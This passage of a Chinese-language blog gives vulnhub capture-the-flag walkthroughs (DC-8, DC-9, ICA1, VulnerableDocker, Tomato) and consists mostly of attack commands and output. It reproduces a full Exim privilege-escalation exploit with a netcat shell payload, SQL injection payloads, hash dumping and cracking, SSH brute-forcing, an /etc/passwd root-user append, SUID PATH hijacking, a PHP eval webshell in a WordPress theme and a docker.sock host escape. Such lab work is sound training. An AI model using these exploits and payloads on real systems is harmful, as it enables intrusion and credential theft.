cache_menu | | cache_page | | cache_path | | cache_views | | cache_views_data | | ckeditor_input_format | | ckeditor_settings | | ctools_css_cache | | ctools_object_cache | | date_format_locale | | date_format_type | | date_formats | | field_config | | field_config_instance | | field_data_body | | field_data_field_image | | field_data_field_tags | | field_revision_body | | field_revision_field_image | | field_revision_field_tags | | file_managed | | file_usage | | filter_format | | flood | | image_effects | | image_styles | | menu_custom | | menu_links | | menu_router | | node | | node_access | | node_revision | | node_type | | queue | | rdf_mapping | | registry | | registry_file | | role_permission | | search_dataset | | search_index | | search_node_links | | search_total | | semaphore | | sequences | | sessions | | shortcut_set | | shortcut_set_users | | site_messages_table | | taxonomy_index | | taxonomy_term_data | | taxonomy_term_hierarchy | | taxonomy_vocabulary | | url_alias | | users | | users_roles | | variable | | views_display | | views_view | | watchdog | | webform | | webform_component | | webform_conditional | | webform_conditional_actions | | webform_conditional_rules | | webform_emails | | webform_last_download | | webform_roles | | webform_submissions | | webform_submitted_data | +-----------------------------+ $ sqlmap -u http://61.139.2.138/?nid=1 -D d7db -T users --columns Database: d7db Table: users [16 columns] +------------------+------------------+ | Column | Type | +------------------+------------------+ | data | longblob | | language | varchar(12) | | name | varchar(60) | | status | tinyint(4) | | access | int(11) | | created | int(11) | | init | varchar(254) | | login | int(11) | | mail | varchar(254) | | pass | varchar(128) | | picture | int(11) | | signature | varchar(255) | | signature_format | varchar(255) | | theme | varchar(255) | | timezone | varchar(32) | | uid | int(10) unsigned | +------------------+------------------+ $ sqlmap -u http://61.139.2.138/?nid=1 -D d7db -T users -C name,pass --dump Database: d7db Table: users [2 entries] +--------+---------------------------------------------------------+ | name | pass | +--------+---------------------------------------------------------+ | admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z | | john | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF | +--------+---------------------------------------------------------+ 写入hash：\nadmin:$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z\rjohn:$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF 只爆出了john的密码：\n$ john hash Using default input encoding: UTF-8 Loaded 2 password hashes with 2 different salts (Drupal7, $S$ [SHA512 512/512 AVX512BW 8x]) Cost 1 (iteration count) is 32768 for all loaded hashes Will run 4 OpenMP threads Proceeding with single, rules:Single Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status Warning: Only 10 candidates buffered for the current salt, minimum 32 needed for performance. Almost done: Processing the remaining buffered candidate passwords, if any. Proceeding with wordlist:/usr/share/john/password.lst turtle (john) dirsearch扫出登录页面：\n[13:59:09] 200 - 2KB - /user/ [13:59:09] 200 - 2KB - /user/login/ contact us中可以传马，不能是纯php代码，否则会返回原来的文本信息：\n尝试suid提权：\n(www-data:/) $ find / -perm -u=s -type f 2\u0026gt;/dev/null /usr/bin/chfn /usr/bin/gpasswd /usr/bin/chsh /usr/bin/passwd /usr/bin/sudo /usr/bin/newgrp /usr/sbin/exim4 /usr/lib/openssh/ssh-keysign /usr/lib/eject/dmcrypt-get-device /usr/lib/dbus-1.0/dbus-daemon-launch-helper /bin/ping /bin/su /bin/umount /bin/mount exim4提权，先查看版本：\n(www-data:/) $ /usr/sbin/exim4 --version Exim version 4.89 #2 built 14-Jun-2017 05:03:07 Copyright (c) University of Cambridge, 1995 - 2017 (c) The Exim Maintainers and contributors in ACKNOWLEDGMENTS file, 2007 - 2017 Berkeley DB: Berkeley DB 5.3.28: (September 9, 2013) Support for: crypteq iconv() IPv6 GnuTLS move_frozen_messages DKIM DNSSEC Event OCSP PRDR SOCKS TCP_Fast_Open Lookups (built-in): lsearch wildlsearch nwildlsearch iplsearch cdb dbm dbmjz dbmnz dnsdb dsearch nis nis0 passwd Authenticators: cram_md5 plaintext Routers: accept dnslookup ipliteral manualroute queryprogram redirect Transports: appendfile/maildir/mailstore autoreply lmtp pipe smtp Fixed never_users: 0 Configure owner: 0:0 Size of off_t: 8 Configuration file is /var/lib/exim4/config.autogenerated searchsploit:\n$ searchsploit Exim 4 Exim 4.87 - 4.91 - Local Privilege Escalation | linux/local/46996.sh 查看如何使用该脚本：\n#!/bin/bash # # raptor_exim_wiz - \u0026#34;The Return of the WIZard\u0026#34; LPE exploit # Copyright (c) 2019 Marco Ivaldi \u0026lt;raptor@0xdeadbeef.info\u0026gt; # # A flaw was found in Exim versions 4.87 to 4.91 (inclusive). # Improper validation of recipient address in deliver_message() # function in /src/deliver.c may lead to remote command execution. # (CVE-2019-10149) # # This is a local privilege escalation exploit for \u0026#34;The Return # of the WIZard\u0026#34; vulnerability reported by the Qualys Security # Advisory team. # # Credits: # Qualys Security Advisory team (kudos for your amazing research!) # Dennis \u0026#39;dhn\u0026#39; Herrmann (/dev/tcp technique) # # Usage (setuid method): # $ id # uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...] # $ ./raptor_exim_wiz -m setuid # Preparing setuid shell helper... # Delivering setuid payload... # [...] # Waiting 5 seconds... # -rwsr-xr-x 1 root raptor 8744 Jun 16 13:03 /tmp/pwned # # id # uid=0(root) gid=0(root) groups=0(root) # # Usage (netcat method): # $ id # uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...] # $ ./raptor_exim_wiz -m netcat # Delivering netcat payload... # Waiting 5 seconds... # localhost [127.0.0.1] 31337 (?) open # id # uid=0(root) gid=0(root) groups=0(root) # # Vulnerable platforms: # Exim 4.87 - 4.91 # # Tested against: # Exim 4.89 on Debian GNU/Linux 9 (stretch) [exim-4.89.tar.xz] # METHOD=\u0026#34;setuid\u0026#34; # default method PAYLOAD_SETUID=\u0026#39;${run{\\x2fbin\\x2fsh\\t-c\\t\\x22chown\\troot\\t\\x2ftmp\\x2fpwned\\x3bchmod\\t4755\\t\\x2ftmp\\x2fpwned\\x22}}@localhost\u0026#39; PAYLOAD_NETCAT=\u0026#39;${run{\\x2fbin\\x2fsh\\t-c\\t\\x22nc\\t-lp\\t31337\\t-e\\t\\x2fbin\\x2fsh\\x22}}@localhost\u0026#39; # usage instructions function usage() { echo \u0026#34;$0 [-m METHOD]\u0026#34; echo echo \u0026#34;-m setuid : use the setuid payload (default)\u0026#34; echo \u0026#34;-m netcat : use the netcat payload\u0026#34; echo exit 1 } # payload delivery function exploit() { # connect to localhost:25 exec 3\u0026lt;\u0026gt;/dev/tcp/localhost/25 # deliver the payload read -u 3 \u0026amp;\u0026amp; echo $REPLY echo \u0026#34;helo localhost\u0026#34; \u0026gt;\u0026amp;3 read -u 3 \u0026amp;\u0026amp; echo $REPLY echo \u0026#34;mail from:\u0026lt;\u0026gt;\u0026#34; \u0026gt;\u0026amp;3 read -u 3 \u0026amp;\u0026amp; echo $REPLY echo \u0026#34;rcpt to:\u0026lt;$PAYLOAD\u0026gt;\u0026#34; \u0026gt;\u0026amp;3 read -u 3 \u0026amp;\u0026amp; echo $REPLY echo \u0026#34;data\u0026#34; \u0026gt;\u0026amp;3 read -u 3 \u0026amp;\u0026amp; echo $REPLY for i in {1..31} do echo \u0026#34;Received: $i\u0026#34; \u0026gt;\u0026amp;3 done echo \u0026#34;.\u0026#34; \u0026gt;\u0026amp;3 read -u 3 \u0026amp;\u0026amp; echo $REPLY echo \u0026#34;quit\u0026#34; \u0026gt;\u0026amp;3 read -u 3 \u0026amp;\u0026amp; echo $REPLY } # print banner echo echo \u0026#39;raptor_exim_wiz - \u0026#34;The Return of the WIZard\u0026#34; LPE exploit\u0026#39; echo \u0026#39;Copyright (c) 2019 Marco Ivaldi \u0026lt;raptor@0xdeadbeef.info\u0026gt;\u0026#39; echo # parse command line while [ ! -z \u0026#34;$1\u0026#34; ]; do case $1 in -m) shift; METHOD=\u0026#34;$1\u0026#34;; shift;; * ) usage ;; esac done if [ -z $METHOD ]; then usage fi # setuid method if [ $METHOD = \u0026#34;setuid\u0026#34; ]; then # prepare a setuid shell helper to circumvent bash checks echo \u0026#34;Preparing setuid shell helper...\u0026#34; echo \u0026#34;main(){setuid(0);setgid(0);system(\\\u0026#34;/bin/sh\\\u0026#34;);}\u0026#34; \u0026gt;/tmp/pwned.c gcc -o /tmp/pwned /tmp/pwned.c 2\u0026gt;/dev/null if [ $? -ne 0 ]; then echo \u0026#34;Problems compiling setuid shell helper, check your gcc.\u0026#34; echo \u0026#34;Falling back to the /bin/sh method.\u0026#34; cp /bin/sh /tmp/pwned fi echo # select and deliver the payload echo \u0026#34;Delivering $METHOD payload...\u0026#34; PAYLOAD=$PAYLOAD_SETUID exploit echo # wait for the magic to happen and spawn our shell echo \u0026#34;Waiting 5 seconds...\u0026#34; sleep 5 ls -l /tmp/pwned /tmp/pwned # netcat method elif [ $METHOD = \u0026#34;netcat\u0026#34; ]; then # select and deliver the payload echo \u0026#34;Delivering $METHOD payload...\u0026#34; PAYLOAD=$PAYLOAD_NETCAT exploit echo # wait for the magic to happen and spawn our shell echo \u0026#34;Waiting 5 seconds...\u0026#34; sleep 5 nc -v 127.0.0.1 31337 # print help else usage fi 把sh脚本传到tmp目录下并运行即可提权：\n$ ./exploit.sh -m setuid $ ./exploit.sh -m netcat /root/flag.txt：\nBrilliant - you have succeeded!!!\r888 888 888 888 8888888b. 888 888 888 888\r888 o 888 888 888 888 \u0026#34;Y88b 888 888 888 888\r888 d8b 888 888 888 888 888 888 888 888 888\r888 d888b 888 .d88b. 888 888 888 888 .d88b. 88888b. .d88b. 888 888 888 888\r888d88888b888 d8P Y8b 888 888 888 888 d88\u0026#34;\u0026#34;88b 888 \u0026#34;88b d8P Y8b 888 888 888 888\r88888P Y88888 88888888 888 888 888 888 888 888 888 888 88888888 Y8P Y8P Y8P Y8P\r8888P Y8888 Y8b. 888 888 888 .d88P Y88..88P 888 888 Y8b. \u0026#34; \u0026#34; \u0026#34; \u0026#34;\r888P Y888 \u0026#34;Y8888 888 888 8888888P\u0026#34; \u0026#34;Y88P\u0026#34; 888 888 \u0026#34;Y8888 888 888 888 888\rHope you enjoyed DC-8. Just wanted to send a big thanks out there to all those\rwho have provided feedback, and all those who have taken the time to complete these little\rchallenges.\rI\u0026#39;m also sending out an especially big thanks to:\r@4nqr34z\r@D4mianWayne\r@0xmzfr\r@theart42\rThis challenge was largely based on two things:\r1. A Tweet that I came across from someone asking about 2FA on a Linux box, and whether it was worthwhile.\r2. A suggestion from @theart42\rThe answer to that question is...\rIf you enjoyed this CTF, send me a tweet via @DCAU7. 参考资料：\nhttps://www.cnblogs.com/A1oe/p/12585077.html\nvulnhub DC9 访问web服务，search存在SQL注入点：\n0\u0026#39; union select 1,2,3,4,5,group_concat(table_name) from information_schema.tables where table_schema=database() # ID: 1 Name: 2 3 Position: 4 Phone No: 5 Email: StaffDetails,Users 0\u0026#39; union select 1,2,3,4,5,group_concat(column_name) from information_schema.columns where table_name=\u0026#34;Users\u0026#34; # ID: 1 Name: 2 3 Position: 4 Phone No: 5 Email: UserID,Username,Password 0\u0026#39; union select 1,2,3,group_concat(Username),5,group_concat(Password) from Users # ID: 1 Name: 2 3 Position: admin Phone No: 5 Email: 在线网站 https://www.somd5.com/ 解md5：\n856f5de590ef37314e7c3bdf6f8a66dc\rtransorbital1 登录后发现存在file参数的文件包含，本题对端口进行了隐藏，需要通过端口敲门来使ssh服务对敲门成功的ip开放，先获取对应配置文件/etc/knockd.conf：\nhttp://127.0.0.1:8085/manage.php?file=../../../../etc/knockd.conf\r[options] UseSyslog [openSSH] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn 依次访问3个端口：\nnc 61.139.2.139 7469 nc 61.139.2.139 8475 nc 61.139.2.139 9842 nmap再次扫描靶机ip：\n$ nmap -A -p 1-65535 61.139.2.139 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-30 10:08 CST Nmap scan report for 61.139.2.139 Host is up (0.00027s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) | ssh-hostkey: | 2048 a2:b3:38:74:32:74:0b:c5:16:dc:13:de:cb:9b:8a:c3 (RSA) | 256 06:5c:93:87:15:54:68:6b:88:91:55:cf:f8:9a:ce:40 (ECDSA) |_ 256 e4:2c:88:da:88:63:26:8c:93:d5:f7:63:2b:a3:eb:ab (ED25519) 80/tcp open http Apache httpd 2.4.38 ((Debian)) |_http-title: Example.com - Staff Details - Welcome |_http-server-header: Apache/2.4.38 (Debian) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 通过sqlmap获取用户信息爆破ssh：\npython sqlmap.py -r sql.txt -dbs --batch [10:25:59] [INFO] fetching database names available databases [3]: [*] information_schema [*] Staff [*] users python sqlmap.py -r sql.txt -D users -T UserDetails --columns --batch [10:31:11] [INFO] fetching columns for table \u0026#39;UserDetails\u0026#39; in database \u0026#39;users\u0026#39; Database: users Table: UserDetails [6 columns] +-----------+-----------------+ | Column | Type | +-----------+-----------------+ | firstname | varchar(30) | | id | int(6) unsigned | | lastname | varchar(30) | | password | varchar(20) | | reg_date | timestamp | | username | varchar(30) | +-----------+-----------------+ python sqlmap.py -r sql.txt -D users -T UserDetails -C username,password --dump --batch [10:32:27] [INFO] fetching entries of column(s) \u0026#39;password,username\u0026#39; for table \u0026#39;UserDetails\u0026#39; in database \u0026#39;users\u0026#39; Database: users Table: UserDetails [17 entries] +-----------+---------------+ | username | password | +-----------+---------------+ | marym | 3kfs86sfd | | julied | 468sfdfsd2 | | fredf | 4sfd87sfd1 | | barneyr | RocksOff | | tomc | TC\u0026amp;TheBoyz | | jerrym | B8m#48sd | | wilmaf | Pebbles | | bettyr | BamBam01 | | chandlerb | UrAG0D! | | joeyt | Passw0rd | | rachelg | yN72#dsd | | rossg | ILoveRachel | | monicag | 3248dsds7s | | phoebeb | smellycats | | scoots | YR3BVxxxw87 | | janitor | Ilovepeepee | | janitor2 | Hawaii-Five-0 | +-----------+---------------+ hydra爆破ssh：\n$ hydra -L username.txt -P passwords.txt ssh://61.139.2.139 -vV -s 22 [22][ssh] host: 61.139.2.139 login: chandlerb password: UrAG0D! [22][ssh] host: 61.139.2.139 login: joeyt password: Passw0rd [22][ssh] host: 61.139.2.139 login: janitor password: Ilovepeepee janitor目录下存在新的密码字典，再爆破一次ssh：\njanitor@dc-9:~$ cat .secrets-for-putin/passwords-found-on-post-it-notes.txt BamBam01 Passw0rd smellycats P0Lic#10-4 B4-Tru3-001 4uGU5T-NiGHts 新的用户fredf：\n$ hydra -L username.txt -P passwords.txt ssh://61.139.2.139 -vV -s 22 [22][ssh] host: 61.139.2.139 login: fredf password: B4-Tru3-001 [22][ssh] host: 61.139.2.139 login: joeyt password: Passw0rd sudo -l找到root权限可执行文件：\nfredf@dc-9:~$ sudo -l Matching Defaults entries for fredf on dc-9: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User fredf may run the following commands on dc-9: (root) NOPASSWD: /opt/devstuff/dist/test/test /opt/devstuff/test.py：\n#!/usr/bin/python import sys if len (sys.argv) != 3 : print (\u0026#34;Usage: python test.py read append\u0026#34;) sys.exit (1) else : f = open(sys.argv[1], \u0026#34;r\u0026#34;) output = (f.read()) f = open(sys.argv[2], \u0026#34;a\u0026#34;) f.write(output) f.close() /etc/passwd提权，向其中写入新用户即可提权：\npython -c \u0026#39;import crypt; print crypt.crypt(\u0026#34;123456\u0026#34;, \u0026#34;$6$salt\u0026#34;)\u0026#39; $6$salt$MktMKPZJ6t59GfxcJU20DwcwQzfMvOlHFVZiOVD71w.igcOo1R7vBYR65JquIQ/7siC7VRpmteKvZmfSkNc69. echo \u0026#39;hacker:$6$salt$MktMKPZJ6t59GfxcJU20DwcwQzfMvOlHFVZiOVD71w.igcOo1R7vBYR65JquIQ/7siC7VRpmteKvZmfSkNc69.:0:0:root:/root:/bin/bash\u0026#39; \u0026gt;\u0026gt; /etc/passwd theflag.txt：\n███╗ ██╗██╗ ██████╗███████╗ ██╗ ██╗ ██████╗ ██████╗ ██╗ ██╗██╗██╗██╗\r████╗ ██║██║██╔════╝██╔════╝ ██║ ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║\r██╔██╗ ██║██║██║ █████╗ ██║ █╗ ██║██║ ██║██████╔╝█████╔╝ ██║██║██║\r██║╚██╗██║██║██║ ██╔══╝ ██║███╗██║██║ ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝\r██║ ╚████║██║╚██████╗███████╗ ╚███╔███╔╝╚██████╔╝██║ ██║██║ ██╗██╗██╗██╗\r╚═╝ ╚═══╝╚═╝ ╚═════╝╚══════╝ ╚══╝╚══╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝╚═╝╚═╝\rCongratulations - you have done well to get to this point.\rHope you enjoyed DC-9. Just wanted to send out a big thanks to all those\rwho have taken the time to complete the various DC challenges.\rI also want to send out a big thank you to the various members of @m0tl3ycr3w .\rThey are an inspirational bunch of fellows.\rSure, they might smell a bit, but...just kidding. :-)\rSadly, all things must come to an end, and this will be the last ever\rchallenge in the DC series.\rSo long, and thanks for all the fish. 参考资料：\nhttps://wiki.archlinux.org.cn/title/Port_knocking\nvulnhub ICA1 先配置一下网络，NAT模式，初始化界面按e进入编辑模式，将 ro（只读）修改为 rw（读写），并且在参数末尾添加single init=/bin/bash，使其进入单用户模式，再按下ctrl+x重启，ip a查看网卡，发现是ens33进入网络配置文件进行修改：vim /etc/network/interfaces，将ep0s17改为ens33，最后再次重启完成配置\nnmap扫描开放端口及服务：\n$ nmap 61.139.2.0/24 Nmap scan report for 61.139.2.134 Host is up (0.00052s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 3306/tcp open mysql 访问web服务：\nqdPM9.2，搜索一下对应版本漏洞，发现存在敏感信息泄露的问题：https://www.exploit-db.com/exploits/50176\n访问http://127.0.0.1:8085/core/config/databases.yml，获取数据库配置yml文件：\nall: doctrine: class: sfDoctrineDatabase param: dsn: \u0026#39;mysql:dbname=qdpm;host=localhost\u0026#39; profiler: false username: qdpmadmin password: \u0026#34;\u0026lt;?php echo urlencode(\u0026#39;UcVQCMQk2STVeS6J\u0026#39;) ; ?\u0026gt;\u0026#34; attributes: quote_identifier: true mysql远程连接到qdpadmin用户：\n$ mysql -u qdpmadmin -h 61.139.2.134 -p Enter password: UcVQCMQk2STVeS6J Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MySQL connection id is 13 Server version: 8.0.26 MySQL Community Server - GPL Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type \u0026#39;help;\u0026#39; or \u0026#39;\\h\u0026#39; for help. Type \u0026#39;\\c\u0026#39; to clear the current input statement. MySQL [(none)]\u0026gt; 获取数据库敏感信息：\nshow databases;\ruse staff;\rshow tables;\rselect * from user;\r+------+---------------+--------+---------------------------+\r| id | department_id | name | role |\r+------+---------------+--------+---------------------------+\r| 1 | 1 | Smith | Cyber Security Specialist |\r| 2 | 2 | Lucas | Computer Engineer |\r| 3 | 1 | Travis | Intelligence Specialist |\r| 4 | 1 | Dexter | Cyber Security Analyst |\r| 5 | 2 | Meyer | Genetic Engineer |\r+------+---------------+--------+---------------------------+\rselect * from login;\r+------+---------+--------------------------+\r| id | user_id | password |\r+------+---------+--------------------------+\r| 1 | 2 | c3VSSkFkR3dMcDhkeTNyRg== |\r| 2 | 4 | N1p3VjRxdGc0MmNtVVhHWA== |\r| 3 | 1 | WDdNUWtQM1cyOWZld0hkQw== |\r| 4 | 3 | REpjZVZ5OThXMjhZN3dMZw== |\r| 5 | 5 | Y3FObkJXQ0J5UzJEdUpTeQ== |\r+------+---------+--------------------------+ password先base64解码再填入passwords.txt中，将数据库中的用户名以及将首字母改写为小写后的所有用户名写入username.txt中，进行ssh爆破：\n[22][ssh] host: 61.139.2.134 login: travis password: DJceVy98W28Y7wLg [22][ssh] host: 61.139.2.134 login: dexter password: 7ZwV4qtg42cmUXGX ssh登录dexter用户：\n$ ssh dexter@61.139.2.134 -p 22 dexter@61.139.2.134\u0026#39;s password: Linux debian 5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Sat Sep 25 08:43:19 2021 from 192.168.1.3 dexter@debian:~$ /home/dexter目录下note.txt：\nIt seems to me that there is a weakness while accessing the system.\rAs far as I know, the contents of executable files are partially viewable.\rI need to find out if there is a vulnerability or not. 查找suid权限可执行文件：\n$ find / -perm -u=s -type f 2\u0026gt;/dev/null /opt/get_access /usr/bin/chfn /usr/bin/umount /usr/bin/gpasswd /usr/bin/sudo /usr/bin/passwd /usr/bin/newgrp /usr/bin/su /usr/bin/mount /usr/bin/chsh /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper 可以用scp命令将/opt/get_access传到kali上，再用IDA进行静态分析：\n$ scp dexter@61.139.2.134:/opt/get_access ./ IDA静态分析：\nint __fastcall main(int argc, const char **argv, const char **envp) { setuid(0); setgid(0); system(\u0026#34;cat /root/system.info\u0026#34;); if ( socket(2, 1, 0) == -1 ) puts(\u0026#34;Could not create socket to access to the system.\u0026#34;); else puts(\u0026#34;All services are disabled. Accessing to the system is allowed only within working hours.\\n\u0026#34;); return 0; } 看到该suid权限程序执行了cat命令，于是可以尝试临时修改环境变量PATH，使该程序先执行指定目录下的cat文件，实现自定义cat命令实现提权：\n$ echo \u0026#34;/bin/bash\u0026#34; \u0026gt; /tmp/cat\r$ export PATH=/tmp:$PATH\r$ chmod +x /tmp/cat\r$ /usr/get_access 获取root目录下的敏感文件：\nroot@debian:~# /bin/cat /root/root.txt\rICA{Next_Generation_Self_Renewable_Genetics} 发现travis用户目录下也有一份敏感文件：\nroot@debian:~# /bin/cat /home/travis/user.txt\rICA{Secret_Project} vulnhub VulnearbleDocker 靶机ip: 61.139.2.142\nnmap全端口扫描：\nnmap -p- 61.139.2.142 --min-rate=10000 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-25 22:31 CST Nmap scan report for 61.139.2.142 Host is up (0.00075s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 8000/tcp open http-alt Nmap done: 1 IP address (1 host up) scanned in 14.24 seconds 存在22端口的 ssh 服务和8000端口的 wordpress 框架的web服务，wpscan：\nwpscan --url http://61.139.2.142:8000/ --api-token IEMpNIjGQXaJnkgB2X6YREjqcWO5Uq2979maC9WAvi8 [+] WordPress version 4.8.1 identified (Insecure, released on 2017-08-02). | Found By: Rss Generator (Passive Detection) | - http://61.139.2.142:8000/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=4.8.1\u0026lt;/generator\u0026gt; | - http://61.139.2.142:8000/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=4.8.1\u0026lt;/generator\u0026gt; | | [!] 89 vulnerabilities identified: 有89个漏洞，但是没找到合适的，试试枚举用户：\nwpscan --url http://61.139.2.142:8000/ -e u [i] User(s) Identified: [+] bob | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Wp Json Api (Aggressive Detection) | - http://61.139.2.142:8000/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Rss Generator (Aggressive Detection) | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) 直接爆破bob用户试试：\nwpscan --url http://61.139.2.142:8000/ -U username.txt -P rockyou.txt [!] Valid Combinations Found:\r| Username: bob, Password: Welcome1 登录后台可以在 posts 找到 flag_1：\n2aa11783d05b6a329ffc4d2a1ce037f46162253e55d53764a6a7e998\rgood job finding this one. Now Lets hunt for the other flags\rhint: they are in files. 本来想改plugins的，但是直接访问/wp-content/plugins会报forbidden，后面考虑修改theme，本题环境用的是Twenty Seventeen的主题，直接改里面的footer.php，开头加上一句话木马:\n\u0026lt;?php @eval($_REQUEST[1]); /** * The template for displaying the footer * * Contains the closing of the #content div and all content after. * * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials * * @package WordPress * @subpackage Twenty_Seventeen * @since 1.0 * @version 1.2 */ ?\u0026gt; 蚁剑连webshell：http://127.0.0.1:8085/wp-content/themes/twentyseventeen/footer.php，用户为 www-data\n根目录下存在.dockerenv，同时/porc/1/cgroup以及 hostname 都存在明显docker特征：\ncat /proc/1/cgroup 11:name=systemd:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669 10:hugetlb:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669 9:perf_event:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669 8:blkio:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669 7:freezer:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669 6:devices:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669 5:memory:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669 4:cpuacct:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669 3:cpu:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669 2:cpuset:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669 hostname 8f4bca8ef241 但是这个容器里没有docker逃逸的条件，先查一下ip：\nip addr 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever 9: eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:ac:12:00:04 brd ff:ff:ff:ff:ff:ff inet 172.18.0.4/16 scope global eth0 valid_lft forever preferred_lft forever 蚁剑传fscan运行：\n./fscan -h 172.18.0.0/24 cat result.txt 172.18.0.4:3306 open 172.18.0.3:80 open 172.18.0.2:22 open 172.18.0.1:22 open 172.18.0.1:8000 open [*] WebTitle http://172.18.0.1:8000 code:200 len:71264 title:NotSoEasy Docker \u0026amp;#8211; Just another WordPress site [*] WebTitle http://172.18.0.3 code:200 len:71044 title:NotSoEasy Docker \u0026amp;#8211; Just another WordPress site 172.18.0.1 是容器 172.18.0.3 的网关，172.18.0.4:3306 是 wordpress 的数据库服务\nwp-config.php：\n\u0026lt;?php /** The name of the database for WordPress */ define(\u0026#39;DB_NAME\u0026#39;, \u0026#39;wordpress\u0026#39;); /** MySQL database username */ define(\u0026#39;DB_USER\u0026#39;, \u0026#39;wordpress\u0026#39;); /** MySQL database password */ define(\u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;WordPressISBest\u0026#39;); /** MySQL hostname */ define(\u0026#39;DB_HOST\u0026#39;, \u0026#39;db:3306\u0026#39;); /** Database Charset to use in creating database tables. */ define(\u0026#39;DB_CHARSET\u0026#39;, \u0026#39;utf8\u0026#39;); /** The Database Collate type. Don\u0026#39;t change this if in doubt. */ define(\u0026#39;DB_COLLATE\u0026#39;, \u0026#39;\u0026#39;); 可以连上mysql服务器，但是没找到什么有用的信息，再扫一下 172.18.0.2 全端口：\n./fscan -h 172.18.0.2 -p 1-65535 172.18.0.2:22 open 172.18.0.2:8022 open proxyfier配置好代理可以直接访问8022端口的web服务，权限为root的一个 docker ssh：\nfind / -name docker.sock /run/docker.sock 容器内安装docker，需要换源，后续利用docker.sock挂载主机根目录到 tmp 目录下即可找到flag_3：\ndocker run -it --rm -v /:/tmp/1 wordpress /bin/bash 参考资料：\nhttps://cloud.tencent.com/developer/news/378799\nhttps://strcpy.me/index.php/archives/775/\nvulnhub Tomato nmap探测靶机ip：\n$ nmap 61.139.2.0/24 Nmap scan report for 61.139.2.130 Host is up (0.00024s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE 21/tcp open ftp 80/tcp open http 8888/tcp open sun-answerbook nmap进一步全端口扫描，获取版本信息：\n$ sudo nmap 61.139.2.130 -sV -sS -p- --min-rate 10000 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-09 12:30 CST Nmap scan report for 61.139.2.130 Host is up (0.0012s latency). Not shown: 65531 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) 2211/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) 8888/tcp open http nginx 1.10.3 (Ubuntu) MAC Address: 00:0C:29:62:FB:52 (VMware) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.84 seconds dirsearch只能扫出403的页面，用dirb再扫一遍：\n$ dirb http://61.139.2.130:80 ----------------- DIRB v2.22 By The Dark Raver ----------------- START_TIME: Tue Dec 9 12:32:34 2025 URL_BASE: 